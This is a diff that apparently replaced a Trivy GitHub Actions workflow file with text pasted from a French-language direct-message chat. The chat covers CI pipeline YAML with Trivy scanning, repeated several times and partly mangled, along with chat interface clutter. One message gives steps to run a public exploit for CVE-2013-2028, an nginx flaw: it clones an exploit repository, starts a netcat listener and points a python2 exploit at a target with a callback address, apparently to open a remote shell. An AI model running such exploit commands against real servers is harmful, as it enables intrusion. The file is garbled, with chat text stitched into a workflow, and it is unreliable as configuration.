@@ -1,47 +1,324 @@
-name: Trivy Security Scan
+Amin Zeggada
+xx.atlantis.xx
+Invisible
+
+Unmute
+
+
+
+Direct Message
+
+Deagant
+deagant
+AKA
+Rémy MiquelJedha
+Search deagant
+
+Deagant chat
+29 May 2026
+
+Amin Zeggada — 29/05/2026 17:37Friday, 29 May 2026 17:37
+ok , je vais essayé ce weekend
+[17:37]Friday, 29 May 2026 17:37
+tiens moi au courant si tu arrive
+
+Deagant — 29/05/2026 17:38Friday, 29 May 2026 17:38
+moi je regarde si mon infra tient la route
+
+Amin Zeggada — 29/05/2026 17:39Friday, 29 May 2026 17:39
+d'accord  ta version 1.3 est normalement patché
+[17:39]Friday, 29 May 2026 17:39
+regards sur github
+
+Deagant — 29/05/2026 17:39Friday, 29 May 2026 17:39
+oui c'est pour ca que j'ai pri celle ci haha
+
+Amin Zeggada — 29/05/2026 17:41Friday, 29 May 2026 17:41
+
+[17:44]Friday, 29 May 2026 17:44
+git clone https://github.com/m4drat/CVE-2013-2028-Exploit.git
+cd CVE-2013-2028-Exploit
+
+Terminal 1 : listener,
+nc -lvnp 1337
+
+Terminal 2 : exploit,
+python2 exploit.py -ra 127.0.0.1 -rp 19321 -la 172.17.0.1 -lp 1337
+GitHub
+GitHub - m4drat/CVE-2013-2028-Exploit: CVE-2013-2028 python exploit
+CVE-2013-2028 python exploit. Contribute to m4drat/CVE-2013-2028-Exploit development by creating an account on GitHub.
+01 June 2026
+
+Deagant — 16:29Monday, 1 June 2026 16:29
+┌──(kali㉿kali)-[~/Desktop/calculator/.github/workflows]
+└─$ cat ci.yml
+name: CI pipeline
 
 on:
   push:
-    branches: [ main, master ]
+    branches: [ main ]
   pull_request:
-    branches: [ main, master ]
+    branches: [ main ]
   workflow_dispatch:
 
+permissions:
+  contents: read
+  security-events: write
+  actions: read
+
 jobs:
-  security-scan:
+  test:
     runs-on: ubuntu-latest
-    permissions:
-      security-events: write
-    
+
+Define a testing strategy to test on multiple Python versions,
+    strategy:
+      matrix:
+        python-version: [3.8, 3.9, '3.10']
+
     steps:
-      - uses: actions/checkout@v4
       
-      - name: Build Docker image
-        run: docker build -t bushidotoolkit:latest .
+name: Checkout code
+      uses: actions/checkout@v3
+    # Step 2: Set up Python with the specified version
+name: Set up Python ${{ matrix.python-version }}
+    uses: actions/setup-python@v4
+    with:
+      python-version: ${{ matrix.python-version }}
+  # Step 3: Install dependencies
+name: Install dependencies
+  run: |
+    python -m pip install --upgrade pip
+    pip install flake8 pytest
+
+# Step 4: Lint with flake8
+name: Lint with flake8
+run: |# stop the build if there are Python syntax errors or undefined names
+  flake8 . --count --select=E9,F63,F7,F82 --show-source --statistics# exit-zero treats all errors as warnings
+  flake8 . --count --exit-zero --max-complexity=10 --max-line-length=127 --statistics,
+
+# Step 5: Test with pytest
+name: Test with pytest
+run: |
+  pytest tests/,
+,
+,
+,
+
+  trivy-scan:
+    runs-on: ubuntu-latest
+    steps:
       
-      - name: Run Trivy scan on filesystem
+name: Checkout code
+      uses: actions/checkout@v3,
+:thumbsup:
+Click to react
+:flag_ca:
+Click to react
+:eyes:
+Click to react
+Add Reaction
+Reply
+Forward
+More
+[16:30]Monday, 1 June 2026 16:30
+Run Trivy vulnerability scanner in filesystem mode and output in SARIF format,
+name: Run Trivy vulnerability scanner in filesystem mode
+uses: aquasecurity/trivy-action@master
+with:
+  scan-type: 'fs'
+  scan-ref: '.'
+  format: 'sarif'
+  output: 'trivy-results.sarif'
+  severity: 'CRITICAL,HIGH',
+
+      # Upload Trivy scan results to GitHub Security tab
+      
+name: Upload Trivy scan results to GitHub Security tab
+      uses: github/codeql-action/upload-sarif@v3
+      with:
+        sarif_file: 'trivy-results.sarif',
+:thumbsup:
+Click to react
+:flag_ca:
+Click to react
+:eyes:
+Click to react
+Add Reaction
+Reply
+Forward
+More
+[16:32]Monday, 1 June 2026 16:32
+name: CI pipeline
+
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  security-events: write
+  actions: read
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    
+    # Define a testing strategy to test on multiple Python versions
+    strategy:
+      matrix:
+        python-version: [3.8, 3.9, '3.10']
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+      
+      # Step 2: Set up Python with the specified version
+      - name: Set up Python ${{ matrix.python-version }}
+        uses: actions/setup-python@v4
+        with:
+          python-version: ${{ matrix.python-version }}
+      
+      # Step 3: Install dependencies
+      - name: Install dependencies
+        run: |
+          python -m pip install --upgrade pip
+          pip install flake8 pytest
+      
+      # Step 4: Lint with flake8
+      - name: Lint with flake8
+        run: |
+          # stop the build if there are Python syntax errors or undefined names
+          flake8 . --count --select=E9,F63,F7,F82 --show-source --statistics
+          # exit-zero treats all errors as warnings
+          flake8 . --count --exit-zero --max-complexity=10 --max-line-length=127 --statistics
+      
+      # Step 5: Test with pytest
+      - name: Test with pytest
+        run: |
+          pytest tests/
+
+  trivy-scan:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+
+      # Run Trivy vulnerability scanner in filesystem mode and output in SARIF format
+      - name: Run Trivy vulnerability scanner in filesystem mode
         uses: aquasecurity/trivy-action@master
         with:
           scan-type: 'fs'
           scan-ref: '.'
           format: 'sarif'
-          output: 'trivy-fs-results.sarif'
-          exit-code: '0'
-      
-      - name: Run Trivy scan on Docker image
+          output: 'trivy-results.sarif'
+          severity: 'CRITICAL,HIGH'
+
+      # Upload Trivy scan results to GitHub Security tab
+      - name: Upload Trivy scan results to GitHub Security tab
+        uses: github/codeql-action/upload-sarif@v3
+        with:
+          sarif_file: 'trivy-results.sarif'
+
+Collapse (74 lines)
+ci.yml
+ci.yml (3 KB)
+3 KB
+:thumbsup:
+Click to react
+:flag_ca:
+Click to react
+:eyes:
+Click to react
+Add Reaction
+Reply
+Forward
+More
+NEW
+
+Deagant — 16:46Monday, 1 June 2026 16:46
+name: Trivy Security Scan
+
+on:
+  push:
+    branches: [main, master]
+  pull_request:
+
+Expand (48 lines)
+trivy.yml
+trivy.yml (2 KB)
+2 KB
+:thumbsup:
+Click to react
+:flag_ca:
+Click to react
+:eyes:
+Click to react
+Add Reaction
+Reply
+Forward
+More
+
+Message @Deagant
+﻿
+Upgrade your friends! Gift them awesome chat perks with Nitro.
+Send GIF
+Deagant’s profile
+
+Deagant
+deagant
+
+Member Since
+9 Sept 2017
+Mutual Servers — 1
+Mutual Friends — 3
+View Full Profile
+name: Trivy Security Scan
+
+on:
+  push:
+    branches: [main, master]
+  pull_request:
+    branches: [main, master]
+  schedule:
+    - cron: '0 6 * * 1'
+
+permissions:
+  contents: read
+  security-events: write
+
+jobs:
+  trivy-scan:
+    name: Scan Python dependencies
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Run Trivy (filesystem)
         uses: aquasecurity/trivy-action@master
         with:
-          image-ref: 'bushidotoolkit:latest'
-          format: 'sarif'
-          output: 'trivy-docker-results.sarif'
-          exit-code: '0'
-      
-      - name: Upload filesystem results
+          scan-type: fs
+          scan-ref: .
+          format: sarif
+          output: trivy-results.sarif
+          severity: CRITICAL,HIGH,MEDIUM
+          ignore-unfixed: false
+
+      - name: Upload to GitHub Security tab
         uses: github/codeql-action/upload-sarif@v3
+        if: always()
         with:
-          sarif_file: 'trivy-fs-results.sarif'
-      
-      - name: Upload Docker results
-        uses: github/codeql-action/upload-sarif@v3
+          sarif_file: trivy-results.sarif
+
+      - name: Print table summary
+        uses: aquasecurity/trivy-action@master
         with:
-          sarif_file: 'trivy-docker-results.sarif'
+          scan-type: fs
+          scan-ref: .
+          format: table
+          severity: CRITICAL,HIGH,MEDIUM
+          ignore-unfixed: false
